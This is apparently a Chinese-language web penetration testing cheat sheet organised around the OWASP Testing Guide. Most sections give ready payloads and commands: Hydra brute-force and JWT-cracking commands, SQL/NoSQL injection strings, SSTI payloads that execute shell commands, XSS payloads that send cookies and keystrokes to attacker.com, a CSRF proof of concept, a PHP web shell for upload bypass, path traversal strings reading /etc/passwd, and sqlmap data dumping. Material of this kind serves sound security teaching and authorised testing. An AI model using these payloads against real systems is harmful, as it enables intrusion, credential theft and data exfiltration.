# Web应用渗透测试

> **基于**: OWASP Testing Guide v4.2
> > **覆盖**: Web应用安全测试全生命周期

## 测试方法论

### OWASP测试类别

| 类别 | 测试内容 |
|------|---------|
| OTG-INFO | 信息收集 |
| OTG-CONFIG | 配置和部署管理测试 |
| OTG-IDENT | 身份管理测试 |
| OTG-AUTHN | 认证测试 |
| OTG-AUTHZ | 授权测试 |
| OTG-SESS | 会话管理测试 |
| OTG-INPVAL | 输入验证测试 |
| OTG-ERR | 错误处理测试 |
| OTG-CRYPTO | 加密测试 |
| OTG-BUSLOGIC | 业务逻辑测试 |
| OTG-CLIENT | 客户端测试 |
| OTG-API | API测试 |

## 身份认证测试

### 暴力破解

```bash
# Hydra
hydra -l admin -P /usr/share/wordlists/rockyou.txt target.com http-post-form "/login:username=^USER^&password=^PASS^:Invalid"

# Medusa
medusa -h target.com -u admin -P passwords.txt -M http -m DIR:/login

# Burp Intruder
# Attack type: Cluster bomb
```

### 会话管理

**Cookie属性检查**
```bash
curl -I http://target.com
# 检查: HttpOnly, Secure, SameSite
```

**JWT测试**
```bash
# 算法混淆 (alg: none)
# 修改header: {"alg":"none"}

# 密钥破解
# jwt_tool
python jwt_tool.py -t eyJ0eXAiOiJKV1Qi...

# 密钥字典攻击
python jwt_tool.py -t token -d /usr/share/wordlists/rockyou.txt
```

### 多因素认证绕过

| 技术 | 描述 |
|------|------|
| 暴力破解OTP | 弱OTP实现 |
| 绕过MFA页面 | 直接访问后续URL |
| 响应操作 | 修改响应绕过验证 |
| OTP重用 | 服务端未验证重用 |
| 备份代码猜测 | 弱备份代码生成 |

## 注入攻击详解

### SQL注入分类

| 类型 | 特征 | 检测方法 |
|------|------|---------|
| 联合查询 | 回显数据 | ' UNION SELECT |
| 报错注入 | 错误信息泄露 | extractvalue() |
| 布尔盲注 | 真假页面差异 | ' AND 1=1 -- |
| 时间盲注 | 延迟响应 | ' AND SLEEP(5) -- |
| 堆叠查询 | 多语句执行 | ; DROP TABLE -- |

### NoSQL注入

```javascript
// MongoDB
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$regex": "admin"}, "password": {"$gt": ""}}
{"username": ["admin"], "password": ["admin"]}
```

### 模板注入 (SSTI)

**Jinja2 (Python)**
```python
{{7*7}}
{{config}}
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{''.__class__.__mro__[1].__subclasses__()[137].__init__.__globals__['system']('ls')}}
```

**Twig (PHP)**
```php
{{7*7}}
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```

**Freemarker (Java)**
```java
${7*7}
${"freemarker.template.utility.Execute"?new()("id")}
```

## 客户端攻击

### XSS 分类

| 类型 | 触发方式 | 存储位置 |
|------|---------|---------|
| 反射型 | 需诱骗点击 | URL参数 |
| 存储型 | 自动触发 | 服务器数据库 |
| DOM型 | 前端解析 | 客户端URL |

### XSS Payloads

```html
<!-- 基础 -->
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>

<!-- 高级利用 -->
<script>fetch('http://attacker.com/log?cookie='+document.cookie)</script>

<!-- Keylogger -->
<script>document.onkeypress=function(e){fetch('http://attacker.com/log?key='+String.fromCharCode(e.which))}</script>
```

### CSRF

```html
<!-- CSRF POC -->
<form action="http://target.com/change-password" method="POST" id="csrf">
  <input type="hidden" name="password" value="hacked">
</form>
<script>document.getElementById('csrf').submit()</script>
```

## 业务逻辑漏洞

### 测试用例清单

| 测试项 | 方法 | 预期结果 |
|--------|------|---------|
| 价格操纵 | 修改price参数 | 验证服务端校验 |
| 数量操纵 | 修改为负数 | 验证服务端校验 |
| IDOR | 修改资源ID | 验证权限控制 |
| 批量赋值 | 添加role字段 | 验证参数过滤 |
| 竞态条件 | 并发请求 | 验证事务处理 |

### IDOR示例
```bash
# 水平越权
curl http://target.com/api/user/123/profile
curl http://target.com/api/user/124/profile

# 垂直越权
curl http://target.com/api/admin/users -H "Cookie: session=user"
```

## 文件操作漏洞

### 文件上传

**绕过技巧**
```
shell.php.jpg          # 双扩展名
shell.php%00.jpg       # 空字节 (PHP < 5.3)
shell.p.phphp          # 双写绕过
Shell.PHP              # 大小写
shell.php.             # 末尾点
shell.php::$DATA       # ADS (Windows)
shell.php%20           # 空格
```

**内容检查绕过**
```php
GIF89a<?php system($_GET['cmd']); ?>
```

### 路径遍历

```
../../../etc/passwd
..\..\..\windows\win.ini
....//....//....//etc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
%252e%252e%252f      # 双重编码
```

## API安全测试

### REST API

**端点发现**
```
/api/v1/
/api/v2/
/swagger-ui.html
/api-docs
/graphql
/v2/api-docs (Spring)
```

**HTTP方法测试**
```bash
curl -X GET http://target.com/api/users
curl -X POST http://target.com/api/users -d '{"name":"test"}'
curl -X PUT http://target.com/api/users/1 -d '{"role":"admin"}'
curl -X DELETE http://target.com/api/users/1
```

**参数污染**
```
?id=1&id=2
?id[]=1&id[]=2
```

### GraphQL

```graphql
# 内省查询
{ __schema { types { name fields { name type { name } } } } }

# 查询所有字段
{ users { id email password phone role } }

# 变异操作
mutation { createUser(name: "test", role: "admin") { id } }

# DoS (别名查询)
{ a1: users { id } a2: users { id } a3: users { id } }
```

## 常用工具

### Burp Suite

| 模块 | 用途 |
|------|------|
| Proxy | 拦截修改请求 |
| Repeater | 手动测试 |
| Intruder | 自动化攻击 |
| Scanner | 自动扫描 (Pro) |
| Decoder | 编码解码 |
| Comparer | 比较响应 |

### 其他工具

```bash
# 主动扫描
nikto -h http://target.com

# SQL注入
sqlmap -u "http://target.com/page.php?id=1" --batch --dump

# XSS检测
python xsstrike.py -u "http://target.com/search?q="

# 命令注入
python commix.py -u "http://target.com/cmd.php"

# 参数发现
python paramspider.py -d target.com

# Git泄露
git-dumper https://target.com/.git/ ./dump
```

## 参考资源

- [OWASP Testing Guide v4.2](https://owasp.org/www-project-web-security-testing-guide/)
- [OWASP Web Security Testing Guide](https://owasp.org/www-project-web-security-testing-guide/latest/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
